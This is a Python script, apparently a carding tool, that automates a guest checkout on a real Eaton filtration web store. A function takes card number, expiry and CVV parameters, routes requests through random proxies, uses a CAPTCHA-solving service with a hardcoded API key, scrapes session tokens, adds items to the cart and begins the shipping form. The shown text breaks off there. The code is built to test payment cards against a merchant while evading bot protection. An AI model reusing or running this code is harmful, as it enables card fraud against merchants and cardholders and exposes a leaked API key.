import aiohttp, uuid, traceback, base64, random
import asyncio
import capsolver
from functions.functions import ProxyRandom

CAPSOLVER_KEY = "CAP-02DB3E5188C3DDD58C43DCF9B69FE560"
SITE_KEY = "6LfBt9wmAAAAAFlQ5-gfCfZNq4OfsDjgam-BI73y"

class CaptchaSolver:
    @staticmethod
    async def Solverv2(sitekey: str, url: str) -> str:
        try:
            capsolver.api_key = CAPSOLVER_KEY

            loop = asyncio.get_event_loop()
            solution = await loop.run_in_executor(
                None,
                lambda: capsolver.solve({
                    "type": "ReCaptchaV2TaskProxyLess",
                    "websiteURL": url,
                    "websiteKey": sitekey,
                })
            )
            captcha = solution["gRecaptchaResponse"]

            return captcha
        except Exception as e:
            print(e)
            return str(e) 

proxy = ProxyRandom

async def cybersource(cc, mes, ano, cvv, proxy):
    async with aiohttp.ClientSession() as session:
        try:
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'es-419,es;q=0.8',
                'cache-control': 'max-age=0',
                # Requests sorts cookies= alphabetically
                # 'cookie': f"dtCookie=v_4_srv_7_sn_C31025CA78D7CE0B97A8C2C4EF275369_perc_100000_ol_0_mul_1_app-3A7a8a77c77fcc9d6f_1; JSESSIONID=l5LLKa2y8Ueyl4DInE5xjkbuyqD0kOWUIn4t7iNkz3Rj1BV64E5X!1567055205; TS01d182d0=01861a5e093abca7af638e7e9dae603266fd67795815fdc63da41d140f0b14bb87d8d95fe64518474d8d2f5fadf16f413eebc0f47c89f70505056435f304c71cddaa60b297; TS01927ad8=01861a5e092f4d98cbd11b68f1a49dbae357b7aca215fdc63da41d140f0b14bb87d8d95fe667470057ea82d48512270efd94bc013d3a8a32e2ee233c58161772279b3e26e8; rxVisitor=1725690390230V5HU37SKRK7BGGK0UCPEURJ2R8T79FQ2; dtSa=-; ak_bmsc=2835FC8E7F4097A75D3ACA5C16ECAEEE~000000000000000000000000000000~YAAQJh3VFxVUF8GRAQAAaLMpyxmQHoot/wiGJID1hAxTA3in+Kv8bnNBb+tGOT8BvFZx+tcXozN9JIIyju2qVaMeDshPn4DoclL0JwMVCLa3XWGdPsZqBWc6D4UksXlIQVApiXOmulrGwj5Q5gXUdAwoouL9KeKoLrRkBHyFUXyWe9VerMMk0rz4A3L2vp0T4kusb9hna4ZJ2PEyu0kVDYBB1/TruOd+Kxaj/sZNQYBMFz5iDWLKpR+6NfFKSAOqyVqCCTq2BuQbaO0Y1uPqyanmlmxJTXq+6q1ZWzEdZTBsTbPDBDzXVMaDVsDtCFLarzSvoUR1XWj/WIEMJyS1KX386lCLe6Oaih7nxI/xr0ID0FvRaF5tRgkFZZOD4KdPtctuzRNBYwiA/w==; bm_sv=CB1337F7A46A5003E008A86460859033~YAAQJh3VFypUF8GRAQAALrYpyxm4JyWkjNkURjhugzSN0qqswzn+Mn6DlcOeLPtbozDlOp4A5OBSibhdrnfaR1QqOJt7qyzmVGiEY5zWbi71e5XZ+gM1rG9uHZ/QoaP8t0JsRlx0HRiCQ1xGB0XhOjJ966h4EyrX37Pvmt9+8djWBSWHw+jNNC6E771ZSm83yxNPij/CX0y2Y8PiE8xSNElVsnWtLRSkxSH3MuCmvrIo3aoA0aC8PaEqGsLsCfE=~1; userID=1725690391355_302594998; rxvt=1725692191802|1725690390235; dtPC={90390223_810h-vUEQUPMUCJGMMAHPHDJRRMHPUKTWMHSKL-0e0}",
                'priority': 'u=0, i',
                'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Brave";v="128"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'none',
                'sec-fetch-user': '?1',
                'sec-gpc': '1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
            }

            response = await session.get('https://filtration-store.eaton.com/store/browse/productDetail.jsp?Ntt=&categoryLevel=&searchLink=/store/filtration/search%3FNr%3DAND%2528sku.etn_price%253AMFGFIC_1101_PR2024%252Cproduct.language%253Aen%252CNOT%2528product.excludedSoldtos%253AMFGFIC_ESTOREA6_1101_10%2529%252CNOT%2528product.hidden_org%253AMFGFIC_1101_10%2529%2529&productId=prod5305729', headers=headers,proxy=proxy)
            r1 = await response.text()

            with open("CybChase1.html", "w", encoding="utf-8") as f:
                f.write(r1)


            dynsess = r1.split('name="_dynSessConf" type="hidden" value="')[1].split('"')[0]


            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'es-419,es;q=0.8',
                'cache-control': 'max-age=0',
                'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryIC9HQYWtQ4SX1Dgx',
                # Requests sorts cookies= alphabetically
                # 'cookie': 'dtCookie=v_4_srv_7_sn_C31025CA78D7CE0B97A8C2C4EF275369_perc_100000_ol_0_mul_1_app-3A7a8a77c77fcc9d6f_1; JSESSIONID=l5LLKa2y8Ueyl4DInE5xjkbuyqD0kOWUIn4t7iNkz3Rj1BV64E5X!1567055205; TS01d182d0=01861a5e093abca7af638e7e9dae603266fd67795815fdc63da41d140f0b14bb87d8d95fe64518474d8d2f5fadf16f413eebc0f47c89f70505056435f304c71cddaa60b297; TS01927ad8=01861a5e092f4d98cbd11b68f1a49dbae357b7aca215fdc63da41d140f0b14bb87d8d95fe667470057ea82d48512270efd94bc013d3a8a32e2ee233c58161772279b3e26e8; rxVisitor=1725690390230V5HU37SKRK7BGGK0UCPEURJ2R8T79FQ2; ak_bmsc=2835FC8E7F4097A75D3ACA5C16ECAEEE~000000000000000000000000000000~YAAQJh3VFxVUF8GRAQAAaLMpyxmQHoot/wiGJID1hAxTA3in+Kv8bnNBb+tGOT8BvFZx+tcXozN9JIIyju2qVaMeDshPn4DoclL0JwMVCLa3XWGdPsZqBWc6D4UksXlIQVApiXOmulrGwj5Q5gXUdAwoouL9KeKoLrRkBHyFUXyWe9VerMMk0rz4A3L2vp0T4kusb9hna4ZJ2PEyu0kVDYBB1/TruOd+Kxaj/sZNQYBMFz5iDWLKpR+6NfFKSAOqyVqCCTq2BuQbaO0Y1uPqyanmlmxJTXq+6q1ZWzEdZTBsTbPDBDzXVMaDVsDtCFLarzSvoUR1XWj/WIEMJyS1KX386lCLe6Oaih7nxI/xr0ID0FvRaF5tRgkFZZOD4KdPtctuzRNBYwiA/w==; bm_sv=CB1337F7A46A5003E008A86460859033~YAAQJh3VFypUF8GRAQAALrYpyxm4JyWkjNkURjhugzSN0qqswzn+Mn6DlcOeLPtbozDlOp4A5OBSibhdrnfaR1QqOJt7qyzmVGiEY5zWbi71e5XZ+gM1rG9uHZ/QoaP8t0JsRlx0HRiCQ1xGB0XhOjJ966h4EyrX37Pvmt9+8djWBSWHw+jNNC6E771ZSm83yxNPij/CX0y2Y8PiE8xSNElVsnWtLRSkxSH3MuCmvrIo3aoA0aC8PaEqGsLsCfE=~1; userID=1725690391355_302594998; rxvt=1725692245941|1725690390235; dtPC=90432793_334h11vUEQUPMUCJGMMAHPHDJRRMHPUKTWMHSKL-0e0; dtSa=false%7CC%7C11%7CAdd%20to%20Cart%7Cx%7C1725690445939%7C90432793_334%7Chttps%3A%2F%2Ffiltration-store.eaton.com%2Fstore%2Fbrowse%2FproductDetail.jsp%3FNtt%3D%26categoryLevel%3D%26searchLink%3D%2Fstore%2Ffiltration%2Fsearch_253FNr_253DAND_252528sku.etn_5Fprice_25253AMFGFIC_5F1101_5FPR2024_25252Cproduct.language_25253Aen_25252CNOT_252528product.excludedSoldtos_25253AMFGFIC_5FESTOREA6_5F1101_5F10_252529_25252CNOT_252528product.hidden_5Forg_25253AMFGFIC_5F1101_5F10_252529_252529%26productId%3Dprod5305729%7C%7C%7C%7C',
                'origin': 'https://filtration-store.eaton.com',
                'priority': 'u=0, i',
                'referer': 'https://filtration-store.eaton.com/store/browse/productDetail.jsp?Ntt=&categoryLevel=&searchLink=/store/filtration/search%3FNr%3DAND%2528sku.etn_price%253AMFGFIC_1101_PR2024%252Cproduct.language%253Aen%252CNOT%2528product.excludedSoldtos%253AMFGFIC_ESTOREA6_1101_10%2529%252CNOT%2528product.hidden_org%253AMFGFIC_1101_10%2529%2529&productId=prod5305729',
                'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Brave";v="128"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'sec-gpc': '1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
            }

            data = f'------WebKitFormBoundaryIC9HQYWtQ4SX1Dgx\r\nContent-Disposition: form-data; name="_dyncharset"\r\n\r\nUTF-8\r\n------WebKitFormBoundaryIC9HQYWtQ4SX1Dgx\r\nContent-Disposition: form-data; name="_dynSessConf"\r\n\r\n{dynsess}\r\n------WebKitFormBoundaryIC9HQYWtQ4SX1Dgx\r\nContent-Disposition: form-data; name="/atg/commerce/order/purchase/CartModifierFormHandler.productId"\r\n\r\nprod5305729\r\n------WebKitFormBoundaryIC9HQYWtQ4SX1Dgx\r\nContent-Disposition: form-data; name="_D:/atg/commerce/order/purchase/CartModifierFormHandler.productId"\r\n\r\n \r\n------WebKitFormBoundaryIC9HQYWtQ4SX1Dgx\r\nContent-Disposition: form-data; name="skuIds"\r\n\r\nsku5315729\r\n------WebKitFormBoundaryIC9HQYWtQ4SX1Dgx\r\nContent-Disposition: form-data; name="_D:skuIds"\r\n\r\n \r\n------WebKitFormBoundaryIC9HQYWtQ4SX1Dgx\r\nContent-Disposition: form-data; name="/atg/commerce/order/purchase/CartModifierFormHandler.dropShipFlag"\r\n\r\nfalse\r\n------WebKitFormBoundaryIC9HQYWtQ4SX1Dgx\r\nContent-Disposition: form-data; name="_D:/atg/commerce/order/purchase/CartModifierFormHandler.dropShipFlag"\r\n\r\n \r\n------WebKitFormBoundaryIC9HQYWtQ4SX1Dgx\r\nContent-Disposition: form-data; name="/atg/commerce/order/purchase/CartModifierFormHandler.pdpFlag"\r\n\r\ntrue\r\n------WebKitFormBoundaryIC9HQYWtQ4SX1Dgx\r\nContent-Disposition: form-data; name="_D:/atg/commerce/order/purchase/CartModifierFormHandler.pdpFlag"\r\n\r\n \r\n------WebKitFormBoundaryIC9HQYWtQ4SX1Dgx\r\nContent-Disposition: form-data; name="/atg/commerce/order/purchase/CartModifierFormHandler.quantity"\r\n\r\n50\r\n------WebKitFormBoundaryIC9HQYWtQ4SX1Dgx\r\nContent-Disposition: form-data; name="_D:/atg/commerce/order/purchase/CartModifierFormHandler.quantity"\r\n\r\n \r\n------WebKitFormBoundaryIC9HQYWtQ4SX1Dgx\r\nContent-Disposition: form-data; name="/atg/commerce/order/purchase/CartModifierFormHandler.addItemToOrderSuccessURL"\r\n\r\nCART\r\n------WebKitFormBoundaryIC9HQYWtQ4SX1Dgx\r\nContent-Disposition: form-data; name="_D:/atg/commerce/order/purchase/CartModifierFormHandler.addItemToOrderSuccessURL"\r\n\r\n \r\n------WebKitFormBoundaryIC9HQYWtQ4SX1Dgx\r\nContent-Disposition: form-data; name="/atg/commerce/order/purchase/CartModifierFormHandler.addItemToOrderErrorURL"\r\n\r\n/store/browse/productDetail.jsp?Ntt=&categoryLevel=&searchLink=/store/filtration/search%3FNr%3DAND%2528sku.etn_price%253AMFGFIC_1101_PR2024%252Cproduct.language%253Aen%252CNOT%2528product.excludedSoldtos%253AMFGFIC_ESTOREA6_1101_10%2529%252CNOT%2528product.hidden_org%253AMFGFIC_1101_10%2529%2529&productId=prod5305729\r\n------WebKitFormBoundaryIC9HQYWtQ4SX1Dgx\r\nContent-Disposition: form-data; name="_D:/atg/commerce/order/purchase/CartModifierFormHandler.addItemToOrderErrorURL"\r\n\r\n \r\n------WebKitFormBoundaryIC9HQYWtQ4SX1Dgx\r\nContent-Disposition: form-data; name="custXrefPart"\r\n\r\n\r\n------WebKitFormBoundaryIC9HQYWtQ4SX1Dgx\r\nContent-Disposition: form-data; name="_D:custXrefPart"\r\n\r\n \r\n------WebKitFormBoundaryIC9HQYWtQ4SX1Dgx\r\nContent-Disposition: form-data; name="custXrefRevPart"\r\n\r\n\r\n------WebKitFormBoundaryIC9HQYWtQ4SX1Dgx\r\nContent-Disposition: form-data; name="_D:custXrefRevPart"\r\n\r\n \r\n------WebKitFormBoundaryIC9HQYWtQ4SX1Dgx\r\nContent-Disposition: form-data; name="/atg/commerce/order/purchase/CartModifierFormHandler.addItemToOrder"\r\n\r\nAdd to Cart\r\n------WebKitFormBoundaryIC9HQYWtQ4SX1Dgx\r\nContent-Disposition: form-data; name="_D:/atg/commerce/order/purchase/CartModifierFormHandler.addItemToOrder"\r\n\r\n \r\n------WebKitFormBoundaryIC9HQYWtQ4SX1Dgx\r\nContent-Disposition: form-data; name="_DARGS"\r\n\r\n/store/browse/productDetailSingleSku.jsp.addToCartForm\r\n------WebKitFormBoundaryIC9HQYWtQ4SX1Dgx--\r\n'

            response = await session.post('https://filtration-store.eaton.com/store/browse/productDetail.jsp?Ntt=&categoryLevel=&searchLink=/store/filtration/search%3FNr%3DAND%2528sku.etn_price%253AMFGFIC_1101_PR2024%252Cproduct.language%253Aen%252CNOT%2528product.excludedSoldtos%253AMFGFIC_ESTOREA6_1101_10%2529%252CNOT%2528product.hidden_org%253AMFGFIC_1101_10%2529%2529&productId=prod5305729&_DARGS=/store/browse/productDetailSingleSku.jsp.addToCartForm', headers=headers, data=data,proxy=proxy)
            r2 = await response.text()


            with open("CybChase2.html", "w", encoding="utf-8") as f:
                f.write(r2)


            tablesuffix = r2.split('name="tableSuffix" value="')[1].split('"')[0]


            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'es-419,es;q=0.8',
                'cache-control': 'max-age=0',
                # Requests sorts cookies= alphabetically
                # 'cookie': f"dtCookie=v_4_srv_7_sn_C31025CA78D7CE0B97A8C2C4EF275369_perc_100000_ol_0_mul_1_app-3A7a8a77c77fcc9d6f_1; JSESSIONID=l5LLKa2y8Ueyl4DInE5xjkbuyqD0kOWUIn4t7iNkz3Rj1BV64E5X!1567055205; TS01d182d0=01861a5e093abca7af638e7e9dae603266fd67795815fdc63da41d140f0b14bb87d8d95fe64518474d8d2f5fadf16f413eebc0f47c89f70505056435f304c71cddaa60b297; TS01927ad8=01861a5e092f4d98cbd11b68f1a49dbae357b7aca215fdc63da41d140f0b14bb87d8d95fe667470057ea82d48512270efd94bc013d3a8a32e2ee233c58161772279b3e26e8; rxVisitor=1725690390230V5HU37SKRK7BGGK0UCPEURJ2R8T79FQ2; ak_bmsc=2835FC8E7F4097A75D3ACA5C16ECAEEE~000000000000000000000000000000~YAAQJh3VFxVUF8GRAQAAaLMpyxmQHoot/wiGJID1hAxTA3in+Kv8bnNBb+tGOT8BvFZx+tcXozN9JIIyju2qVaMeDshPn4DoclL0JwMVCLa3XWGdPsZqBWc6D4UksXlIQVApiXOmulrGwj5Q5gXUdAwoouL9KeKoLrRkBHyFUXyWe9VerMMk0rz4A3L2vp0T4kusb9hna4ZJ2PEyu0kVDYBB1/TruOd+Kxaj/sZNQYBMFz5iDWLKpR+6NfFKSAOqyVqCCTq2BuQbaO0Y1uPqyanmlmxJTXq+6q1ZWzEdZTBsTbPDBDzXVMaDVsDtCFLarzSvoUR1XWj/WIEMJyS1KX386lCLe6Oaih7nxI/xr0ID0FvRaF5tRgkFZZOD4KdPtctuzRNBYwiA/w==; bm_sv=CB1337F7A46A5003E008A86460859033~YAAQJh3VFypUF8GRAQAALrYpyxm4JyWkjNkURjhugzSN0qqswzn+Mn6DlcOeLPtbozDlOp4A5OBSibhdrnfaR1QqOJt7qyzmVGiEY5zWbi71e5XZ+gM1rG9uHZ/QoaP8t0JsRlx0HRiCQ1xGB0XhOjJ966h4EyrX37Pvmt9+8djWBSWHw+jNNC6E771ZSm83yxNPij/CX0y2Y8PiE8xSNElVsnWtLRSkxSH3MuCmvrIo3aoA0aC8PaEqGsLsCfE=~1; userID=1725690391355_302594998; rxvt=1725692249633|1725690390235; dtPC={90447587_774h-vUEQUPMUCJGMMAHPHDJRRMHPUKTWMHSKL-0e0;} dtSa=true%7CC%7C-1%7CProceed%20to%20Checkout%7C-%7C1725690970673%7C90447587_774%7Chttps%3A%2F%2Ffiltration-store.eaton.com%2Fstore%2Fcheckout%2Fcart.jsp%3F_5Frequestid%3D5307524%7C%7C%7C%7C",
                'origin': 'https://filtration-store.eaton.com',
                'priority': 'u=0, i',
                'referer': 'https://filtration-store.eaton.com/store/checkout/cart.jsp?_requestid=5307524',
                'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Brave";v="128"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'sec-gpc': '1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
            }

            data = {
                '_dyncharset': 'UTF-8',
                '_dynSessConf': dynsess,
                '/atg/commerce/order/purchase/CartModifierFormHandler.cartView': 'More',
                '_D:/atg/commerce/order/purchase/CartModifierFormHandler.cartView': ' ',
                'locale': '',
                'storeId': 'MFGFIC_1101_10',
                '/atg/commerce/order/purchase/CartModifierFormHandler.commerceItemsDTO[0].quantity': '50',
                '_D:/atg/commerce/order/purchase/CartModifierFormHandler.commerceItemsDTO[0].quantity': ' ',
                '/atg/commerce/order/purchase/CartModifierFormHandler.commerceItemsDTO[0].dropShipSelection': 'false',
                '_D:/atg/commerce/order/purchase/CartModifierFormHandler.commerceItemsDTO[0].dropShipSelection': ' ',
                'partNum': '',
                'tableSuffix': tablesuffix,
                'resultsPage': '',
                'soldToIdStockLead': 'MFGFIC_ESTOREA6_1101_10',
                'switchStockSoldToId': '',
                '/atg/commerce/order/purchase/CartModifierFormHandler.commerceItemsDTO[0].previousQuantity': '50',
                '_D:/atg/commerce/order/purchase/CartModifierFormHandler.commerceItemsDTO[0].previousQuantity': ' ',
                '/atg/commerce/order/purchase/CartModifierFormHandler.commerceItemsDTO[0].commerceItemId': tablesuffix,
                '_D:/atg/commerce/order/purchase/CartModifierFormHandler.commerceItemsDTO[0].commerceItemId': ' ',
                'customerType': 'B2C',
                '/atg/commerce/order/purchase/CartModifierFormHandler.txtProceedToCheckOut': 'true',
                '_D:/atg/commerce/order/purchase/CartModifierFormHandler.txtProceedToCheckOut': ' ',
                '/atg/commerce/order/purchase/CartModifierFormHandler.emergencyOrder': 'false',
                '_D:/atg/commerce/order/purchase/CartModifierFormHandler.emergencyOrder': ' ',
                '/atg/commerce/order/purchase/CartModifierFormHandler.txtProceedToPunchOutCheckOut': '',
                '_D:/atg/commerce/order/purchase/CartModifierFormHandler.txtProceedToPunchOutCheckOut': ' ',
                '/atg/commerce/order/purchase/CartModifierFormHandler.downloadExcel': 'false',
                '_D:/atg/commerce/order/purchase/CartModifierFormHandler.downloadExcel': ' ',
                '/atg/commerce/order/purchase/CartModifierFormHandler.updateCartOnly': 'false',
                '_D:/atg/commerce/order/purchase/CartModifierFormHandler.updateCartOnly': ' ',
                '/atg/commerce/order/purchase/CartModifierFormHandler.updateSuccessURL': 'CART',
                '_D:/atg/commerce/order/purchase/CartModifierFormHandler.updateSuccessURL': ' ',
                '/atg/commerce/order/purchase/CartModifierFormHandler.updateErrorURL': 'CART',
                '_D:/atg/commerce/order/purchase/CartModifierFormHandler.updateErrorURL': ' ',
                '/atg/commerce/order/purchase/CartModifierFormHandler.updateCart': 'submit',
                '_D:/atg/commerce/order/purchase/CartModifierFormHandler.updateCart': ' ',
                '/atg/commerce/order/purchase/CartModifierFormHandler.guestCheckoutUrl': '/store/checkout/guestCheckout.jsp',
                '_D:/atg/commerce/order/purchase/CartModifierFormHandler.guestCheckoutUrl': ' ',
                '/atg/commerce/order/purchase/CartModifierFormHandler.txtProceedToScheduleOrder': '',
                '_D:/atg/commerce/order/purchase/CartModifierFormHandler.txtProceedToScheduleOrder': ' ',
                '_DARGS': '/store/checkout/cart.jsp.updateCartForm',
            }

            response = await session.post('https://filtration-store.eaton.com/store/checkout/cart.jsp?_DARGS=/store/checkout/cart.jsp.updateCartForm', headers=headers, data=data,proxy=proxy)
            r3 = await response.text()

            with open("CybChase3.html", "w", encoding="utf-8") as f:
                f.write(r3)


            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'es-419,es;q=0.8',
                'cache-control': 'max-age=0',
                # Requests sorts cookies= alphabetically
                # 'cookie': f"dtCookie=v_4_srv_7_sn_C31025CA78D7CE0B97A8C2C4EF275369_perc_100000_ol_0_mul_1_app-3A7a8a77c77fcc9d6f_1; JSESSIONID=l5LLKa2y8Ueyl4DInE5xjkbuyqD0kOWUIn4t7iNkz3Rj1BV64E5X!1567055205; TS01927ad8=01861a5e092f4d98cbd11b68f1a49dbae357b7aca215fdc63da41d140f0b14bb87d8d95fe667470057ea82d48512270efd94bc013d3a8a32e2ee233c58161772279b3e26e8; rxVisitor=1725690390230V5HU37SKRK7BGGK0UCPEURJ2R8T79FQ2; ak_bmsc=2835FC8E7F4097A75D3ACA5C16ECAEEE~000000000000000000000000000000~YAAQJh3VFxVUF8GRAQAAaLMpyxmQHoot/wiGJID1hAxTA3in+Kv8bnNBb+tGOT8BvFZx+tcXozN9JIIyju2qVaMeDshPn4DoclL0JwMVCLa3XWGdPsZqBWc6D4UksXlIQVApiXOmulrGwj5Q5gXUdAwoouL9KeKoLrRkBHyFUXyWe9VerMMk0rz4A3L2vp0T4kusb9hna4ZJ2PEyu0kVDYBB1/TruOd+Kxaj/sZNQYBMFz5iDWLKpR+6NfFKSAOqyVqCCTq2BuQbaO0Y1uPqyanmlmxJTXq+6q1ZWzEdZTBsTbPDBDzXVMaDVsDtCFLarzSvoUR1XWj/WIEMJyS1KX386lCLe6Oaih7nxI/xr0ID0FvRaF5tRgkFZZOD4KdPtctuzRNBYwiA/w==; bm_sv=CB1337F7A46A5003E008A86460859033~YAAQJh3VFypUF8GRAQAALrYpyxm4JyWkjNkURjhugzSN0qqswzn+Mn6DlcOeLPtbozDlOp4A5OBSibhdrnfaR1QqOJt7qyzmVGiEY5zWbi71e5XZ+gM1rG9uHZ/QoaP8t0JsRlx0HRiCQ1xGB0XhOjJ966h4EyrX37Pvmt9+8djWBSWHw+jNNC6E771ZSm83yxNPij/CX0y2Y8PiE8xSNElVsnWtLRSkxSH3MuCmvrIo3aoA0aC8PaEqGsLsCfE=~1; userID=1725690391355_302594998; rxvt=1725692249633|1725690390235; dtPC={90447587_774h-vUEQUPMUCJGMMAHPHDJRRMHPUKTWMHSKL-0e0;} dtSa=true%7CC%7C-1%7CProceed%20to%20Checkout%7C-%7C1725690970673%7C90447587_774%7Chttps%3A%2F%2Ffiltration-store.eaton.com%2Fstore%2Fcheckout%2Fcart.jsp%3F_5Frequestid%3D5307524%7C%7C%7C%7C; TS01d182d0=01861a5e09578239f35799bb9b855d0128f40184788546cda065e309e76c4a45d6165f2e51802e6d78428f656e92111e930acc5b430151c581d44f63b450804c6a546646b3",
                'origin': 'https://filtration-store.eaton.com',
                'priority': 'u=0, i',
                'referer': 'https://filtration-store.eaton.com/store/checkout/guestCheckout.jsp?_requestid=5307817',
                'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Brave";v="128"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'sec-gpc': '1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
            }

            data = {
                '_dyncharset': 'UTF-8',
                '_dynSessConf': dynsess,
                '/atg/commerce/order/purchase/CartModifierFormHandler.shippingGolfPrideUrl': '/store/order/shippingAddress.jsp',
                '_D:/atg/commerce/order/purchase/CartModifierFormHandler.shippingGolfPrideUrl': ' ',
                '/atg/commerce/order/purchase/CartModifierFormHandler.guestCheckoutGolfPrideUrl': '/store/checkout/guestCheckout.jsp',
                '_D:/atg/commerce/order/purchase/CartModifierFormHandler.guestCheckoutGolfPrideUrl': ' ',
                '/atg/commerce/order/purchase/CartModifierFormHandler.continueAsGuest': 'submit',
                '_D:/atg/commerce/order/purchase/CartModifierFormHandler.continueAsGuest': ' ',
                '_DARGS': '/store/checkout/guestCheckout.jsp',
            }

            response = await session.post('https://filtration-store.eaton.com/store/checkout/guestCheckout.jsp?_DARGS=/store/checkout/guestCheckout.jsp', headers=headers, data=data,proxy=proxy)
            r4 = await response.text()

            with open("CybChase4.html", "w", encoding="utf-8") as f:
                f.write(r4)


            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'es-419,es;q=0.8',
                'cache-control': 'max-age=0',
                # Requests sorts cookies= alphabetically
                # 'cookie': f"dtCookie=v_4_srv_7_sn_C31025CA78D7CE0B97A8C2C4EF275369_perc_100000_ol_0_mul_1_app-3A7a8a77c77fcc9d6f_1; JSESSIONID=l5LLKa2y8Ueyl4DInE5xjkbuyqD0kOWUIn4t7iNkz3Rj1BV64E5X!1567055205; TS01927ad8=01861a5e092f4d98cbd11b68f1a49dbae357b7aca215fdc63da41d140f0b14bb87d8d95fe667470057ea82d48512270efd94bc013d3a8a32e2ee233c58161772279b3e26e8; rxVisitor=1725690390230V5HU37SKRK7BGGK0UCPEURJ2R8T79FQ2; ak_bmsc=2835FC8E7F4097A75D3ACA5C16ECAEEE~000000000000000000000000000000~YAAQJh3VFxVUF8GRAQAAaLMpyxmQHoot/wiGJID1hAxTA3in+Kv8bnNBb+tGOT8BvFZx+tcXozN9JIIyju2qVaMeDshPn4DoclL0JwMVCLa3XWGdPsZqBWc6D4UksXlIQVApiXOmulrGwj5Q5gXUdAwoouL9KeKoLrRkBHyFUXyWe9VerMMk0rz4A3L2vp0T4kusb9hna4ZJ2PEyu0kVDYBB1/TruOd+Kxaj/sZNQYBMFz5iDWLKpR+6NfFKSAOqyVqCCTq2BuQbaO0Y1uPqyanmlmxJTXq+6q1ZWzEdZTBsTbPDBDzXVMaDVsDtCFLarzSvoUR1XWj/WIEMJyS1KX386lCLe6Oaih7nxI/xr0ID0FvRaF5tRgkFZZOD4KdPtctuzRNBYwiA/w==; bm_sv=CB1337F7A46A5003E008A86460859033~YAAQJh3VFypUF8GRAQAALrYpyxm4JyWkjNkURjhugzSN0qqswzn+Mn6DlcOeLPtbozDlOp4A5OBSibhdrnfaR1QqOJt7qyzmVGiEY5zWbi71e5XZ+gM1rG9uHZ/QoaP8t0JsRlx0HRiCQ1xGB0XhOjJ966h4EyrX37Pvmt9+8djWBSWHw+jNNC6E771ZSm83yxNPij/CX0y2Y8PiE8xSNElVsnWtLRSkxSH3MuCmvrIo3aoA0aC8PaEqGsLsCfE=~1; userID=1725690391355_302594998; rxvt=1725692249633|1725690390235; dtPC={90447587_774h-vUEQUPMUCJGMMAHPHDJRRMHPUKTWMHSKL-0e0;} dtSa=true%7CC%7C-1%7CProceed%20to%20Checkout%7C-%7C1725690970673%7C90447587_774%7Chttps%3A%2F%2Ffiltration-store.eaton.com%2Fstore%2Fcheckout%2Fcart.jsp%3F_5Frequestid%3D5307524%7C%7C%7C%7C; TS01d182d0=01861a5e09a5b6c825b04ea49d594ced352074be253341767f769aa3b435007faad0b6d9bbc4dc11b8d19c7eb852d3593533571617f01d58c11b216106a494168d30dcd84c",
                'origin': 'https://filtration-store.eaton.com',
                'priority': 'u=0, i',
                'referer': 'https://filtration-store.eaton.com/store/order/shippingAddress.jsp?_requestid=5307927',
                'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Brave";v="128"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'sec-gpc': '1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
            }

            data = [
                ('_dyncharset', 'UTF-8'),
                ('_dynSessConf', dynsess),
                ('_D:/atg/commerce/order/purchase/CartModifierFormHandler.selectedShippingMode', ' '),
                ('/atg/commerce/order/purchase/CartModifierFormHandler.selectedShippingMode', '3900002'),
                ('/atg/commerce/order/purchase/CartModifierFormHandler.standardAddress', 'false'),
                ('_D:/atg/commerce/order/purchase/CartModifierFormHandler.standardAddress', ' '),
                ('/atg/commerce/order/purchase/CartModifierFormHandler.selectedAddressId', ''),
                ('_D:/atg/commerce/order/purchase/CartModifierFormHandler.selectedAddressId', ' '),
